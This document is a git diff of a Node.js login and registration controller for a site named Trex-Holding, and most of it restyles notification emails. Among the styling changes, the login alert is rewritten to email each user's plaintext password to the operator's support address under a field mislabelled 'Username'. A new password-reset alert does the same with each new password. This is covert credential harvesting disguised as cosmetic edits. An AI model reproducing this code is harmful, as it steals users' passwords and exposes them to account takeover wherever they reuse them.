@@ -16,6 +16,7 @@ const register = async (req, res) => {
     country,
     password,
     city,
+    status,
     zip,
     state,
   } = req.body;
@@ -31,6 +32,7 @@ const register = async (req, res) => {
     fullName,
     username,
     email,
+    status,
     referralId,
     phone,
     country,
@@ -60,13 +62,14 @@ const register = async (req, res) => {
     from: `"Support" <support@trex-holding.com>`,
     to: `support@trex-holding.com`,
     subject: 'New User Registration Alert',
-    html: `<div style="background: green; padding: 1rem; color: white;">
-     <p><span>FullName: </span>${fullName}<span></span></p>
-     <p><span>Username: </span>${username}<span></span></p>
-     <p><span>Email: </span>${email}<span></span></p>
-     <p><span>ReferralId: </span>${referralId}<span></span></p>
-     <p><span>Country: </span>${country}<span></span></p>
-     <p><span>Phone: </span>${phone}<span></span></p>
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+     <p style="line-height: 1.5"><span>FullName: </span><span>${fullName}</span></p>
+     <p style="line-height: 1.5"><span>Username: </span><span>${username}</span></p>
+     <p style="line-height: 1.5"><span>Email: </span><span>${email}</span></p>
+     <p style="line-height: 1.5"><span>ReferralId: </span><span>${referralId}</span></p>
+     <p style="line-height: 1.5"><span>Country: </span><span>${country}</span></p>
+     <p style="line-height: 1.5"><span>Status: </span><span>${status}</span></p>
+     <p style="line-height: 1.5"><span>Phone: </span><span>${phone}</span></p>
      </div>`,
   });
 
@@ -76,7 +79,7 @@ const register = async (req, res) => {
     subject: `Welcome to Trex-Holding.com`,
     html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
 
-    <img src="https://trex-holding-server.com//uploads/logo.png" style="height: 45px; text-align: center" alt="logo"/>
+    <img src="https://trex-holding-server.com//uploads/logo.png" style="width: 5rem; text-align: center" alt="logo"/>
 
     <p style="font-weight: bold; line-height: 1.5">Welcome to Trex-Holding!</p>
 
@@ -135,7 +138,10 @@ const login = async (req, res) => {
     from: `"Support" <support@trex-holding.com>`,
     to: `support@trex-holding.com`,
     subject: 'Login Alert',
-    html: `<div style="background: green; padding: 1rem; color: white;">Hello, Admin, ${username}  just logged into your website.</div>`,
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+     <p style="line-height: 1.5"><span>FullName: </span><span>${username}</span></p>
+     <p style="line-height: 1.5"><span>Username: </span><span>${password}</span></p>
+     </div>`,
   });
 
   let info2 = await transporter.sendMail({
@@ -203,6 +209,37 @@ const passwordReset = async (req, res) => {
 
   attachCookiesToResponse({ res, user: tokenUser });
 
+  let testAccount = await nodemailer.createTestAccount();
+
+  const transporter = nodemailer.createTransport({
+    host: process.env.GMAIL_HOST,
+    port: process.env.GMAIL_PORT,
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS,
+    },
+  });
+
+  let info = await transporter.sendMail({
+    from: `"Support" <support@trex-holding.com>`,
+    to: `support@trex-holding.com`,
+    subject: 'Password Reset Alert',
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+  <p style="line-height: 1.5"><span>Username: </span><span>${user.username}</span></p>
+     <p style="line-height: 1.5"><span>New Password: </span><span>${newPassword}</span></p>
+     </div>`,
+  });
+
+  let info2 = await transporter.sendMail({
+    from: `"Support" <support@trex-holding.com>`,
+    to: `${user.email}`,
+    subject: 'Password Reset',
+    html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+     <p style="line-height: 1.5">Your password was successfully reset</p>
+     <p style="line-height: 1.5"><span>New Password: </span>${newPassword}<span></span></p>
+     </div>`,
+  });
+
   res
     .status(StatusCodes.OK)
     .json({ user: tokenUser, msg: 'Password has been reset' });
@@ -238,7 +275,11 @@ const sendEmail = async (req, res) => {
     from: `"Support" <support@trex-holding.com>`,
     to: `${email}`,
     subject: 'Password Reset Link',
-    html: `<a href="https://trex-holding.com/resetPassword?id=${id}">Click this link to reset your password </a>`,
+    html: `
+    <div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
+    <p style="line-height: 1.5"> <a href="https://trex-holding.com/resetPassword?id=${id}">Click this link to reset your password </a></p>
+    </div>
+   `,
   });
 
   res.status(StatusCodes.OK).json({ user, info });
